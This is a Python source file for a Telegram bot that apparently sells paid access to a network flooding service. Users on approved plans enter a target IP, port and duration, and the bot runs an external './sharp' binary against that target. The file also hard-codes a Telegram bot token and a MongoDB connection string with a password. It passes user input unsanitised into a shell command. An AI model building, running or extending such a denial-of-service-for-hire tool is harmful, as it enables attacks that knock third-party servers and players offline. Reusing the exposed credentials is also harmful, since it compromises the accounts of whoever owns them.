import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()

TOKEN = '7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0'
ADMIN_IDS = [8167507955]  # List of admin user IDs
OWNER_USERNAME = "@seedhe_maut_bot"  # New owner username
MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
FORWARD_CHANNEL_ID = -1002512368825
CHANNEL_ID = -1002512368825
ERROR_CHANNEL_ID = -1002512368825

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []

REMOTE_HOST = '4.213.71.147'  

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./sharp {target_ip} {target_port} {duration} 70"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Plan limit reached (99 users)*", parse_mode='Markdown')
                return
        elif plan == 2: 
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Plan limit reached (499 users)*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your plan is currently not available due to limit reached*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*Your plan is currently not available due to limit reached*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter target IP, port, and duration (seconds) separated by spaces*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid format. Use: IP PORT TIME*", parse_mode='Markdown')
            return
            
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, 
                        f"*Attack started: {target_ip}:{target_port} for {duration} seconds*\n"
                        "*Don't attack same target repeatedly*", 
                        parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    
    btn_attack = KeyboardButton("FLOODING START 🔱")
    btn_stop = KeyboardButton("ATTACK STOP 🚀")
    btn_account = KeyboardButton("MY ACCOUNT 🥷")
    btn_admin = KeyboardButton("ADMIN ⛳")

    markup.add(btn_attack, btn_stop, btn_account, btn_admin)

    welcome_msg = (
        "*Welcome to the Bot*\n\n"
        f"Owner: {OWNER_USERNAME}\n"
        "Use the buttons below to navigate:"
    )
    
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "FLOODING START 🔱":
        attack_command(message)
    elif message.text == "ATTACK STOP 🚀":
        bot.send_message(message.chat.id, "*Stop feature coming soon*", parse_mode='Markdown')
    elif message.text == "MY ACCOUNT 🥷":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        
        if user_data:
            username = message.from_user.username or "N/A"
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            
            response = (
                f"*ACCOUNT INFO*\n"
                f"Username: {username}\n"
                f"User ID: {user_id}\n"
                f"Plan: {plan}\n"
                f"Valid Until: {valid_until}\n"
                f"Bot Owner: {OWNER_USERNAME}"
            )
        else:
            response = "*No account found*"
            
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "ADMIN ⛳":
        bot.reply_to(message, f"*Contact admin: {OWNER_USERNAME}*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid command*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    
    logging.info("Starting bot...")
    logging.info(f"Bot Owner: {OWNER_USERNAME}")
    
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(10)
